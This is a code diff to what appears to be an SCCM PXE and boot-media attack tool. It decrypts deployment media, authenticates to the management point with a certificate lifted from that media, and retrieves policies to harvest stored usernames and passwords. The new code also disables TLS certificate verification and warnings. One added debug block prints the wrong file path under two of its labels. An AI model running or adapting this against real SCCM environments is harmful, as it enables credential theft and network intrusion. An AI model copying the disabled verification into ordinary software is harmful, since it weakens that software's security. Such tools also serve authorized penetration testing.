@@ -36,6 +36,9 @@ from rich.console import Console
 from Registry import Registry
 from threading import Thread
 
+import urllib3
+from requests_pkcs12 import Pkcs12Adapter
+
 # Scapy global variables
 clientIPAddress = ""
 clientMacAddress = ""
@@ -731,14 +734,23 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
 
     # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     # print("[+] Retrieving Needed Metadata from SCCM Server...")
+
+    # Hiding errors 
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    
     if (VERBOSE):
         print_nice("Target Management Point URL: " + SCCM_BASE_URL, "INFO")
     session = requests.Session()
 
+    # This change was made after a request from a Pentester named Joshua Dean, who found that their enviroment was using mTLS and Certiicates 
     if USING_TLS:
         session.verify = False
-        session.cert = (CERT_FILE,KEY_FILE)
+        #session.cert = (CERT_FILE,KEY_FILE)
+        # So odd that SMS_MEDIA_GUID is the password for the PFX, but is truncated to the first 31 chars only
+        session.mount(SCCM_BASE_URL, Pkcs12Adapter(pkcs12_data=binascii.unhexlify(SMS_MEDIA_PFX), pkcs12_password=SMS_MEDIA_GUID[:31]))
+
         #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
+
     if USING_PROXY:
         proxies = {"https":'127.0.0.1:8080'}
         session.proxies = proxies
@@ -1164,7 +1176,7 @@ class credential_processing_result:
         usernames, passwords = self._deduplicated_credentials()
         if not usernames and not passwords:
             return
-        table = Table(title="Deduplicated Credentials")
+        table = Table(title="Deduplicated Credentials (not combos)")
         table.add_column("Username", justify="center", no_wrap=True)
         table.add_column("Password", justify="center", no_wrap=True)
         # The two lists are independent deduplicated sets; pair them positionally
@@ -1270,7 +1282,8 @@ def extract_key_information_from_variables(input):
             print_nice("Identifying Management Point URL from media variables", "INFO")
 
         if SMSTSMP is not None:
-            SCCM_BASE_URL = SMSTSMP.text
+            # Modifying to fix a bug where if multiple SCCM enviroment variables are found, they default to the first one.
+            SCCM_BASE_URL = SMSTSMP.text.split('*')[0]
         
         #Partial Media - SMSTSLocationMPs
         elif SMSTSLocationMPs is not None:    
@@ -1311,7 +1324,11 @@ def parse_media_files(password:str = None, variables_file:str = None, policy_fil
                 #print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
                 pass
         else:
-            media_variables = decrypt_media_file(variables_file, password)
+            # Doing this as a way to check for if we use a hex based password (IE your encrypted_key) or a string password (standard set password)
+            if (type(password) == str):
+                media_variables = decrypt_media_file(variables_file, password)
+            else:
+                media_variables = decrypt_pxe_media_from_encrypted_key(password, variables_file)
 
         if (media_variables == None):
             return [None, None]
@@ -1965,7 +1982,7 @@ def _get_pxe_files_sccm(tftp_server_ip, pxe_info):
 
     # If the BCD validated file contains a blank password, use it
     if BLANK_PASSWORDS_FOUND:
-        write_to_file(WORKING_DIR, "encrypted_key", encrypted_key, "binary")
+        write_to_file(WORKING_DIR, "encrypted_key.hex", encrypted_key, "binary")
 
     variables_file_location = os.path.join(WORKING_DIR, variables_filename)
     bcd_file_location = os.path.join(WORKING_DIR, bcd_filename)
@@ -2647,6 +2664,12 @@ if __name__ == "__main__":
                 sys.exit(0)
 
             variables_path, policy_path, bcd_path = scan_for_files(folder)
+            if (VERBOSE):
+                print_nice(f"Variables: {variables_path}", "INFO")
+                print_nice(f"Policy: {variables_path}", "INFO")
+                print_nice(f"BCD: {variables_path}", "INFO")
+
+
             
             if (variables_path == None):
                 print_nice("No media variables file found in folder", "ERROR")
@@ -2673,7 +2696,7 @@ if __name__ == "__main__":
             if (password.startswith("0x")):
                 # Hex encoded password, aka when we have a password used for boot.var files
                 password = binascii.unhexlify(password[2:])
-
+        
         media_variables, decrypted_policy = parse_media_files(password, variables_path, policy_path, bcd_path)
 
         if (media_variables != None):
